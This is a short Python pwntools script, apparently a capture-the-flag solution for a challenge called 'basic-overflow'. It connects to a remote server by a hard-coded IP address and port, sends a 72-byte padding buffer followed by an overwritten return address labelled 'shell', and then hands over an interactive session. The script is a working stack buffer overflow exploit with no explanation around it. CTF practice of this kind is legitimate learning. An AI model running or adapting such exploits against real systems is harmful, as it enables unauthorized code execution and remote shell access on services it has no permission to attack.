from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
#elf = ELF("./file")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/libc.so.6"}


#p = process("./basic-overflow")
p = remote("34.123.15.202", 5000)
#p = gdb.debug("./basic-overflow", '''
#b *main+20''')

shell = p64(0x401136)

payload  = b"A" * 72
payload += shell

p.sendline(payload)
p.interactive()
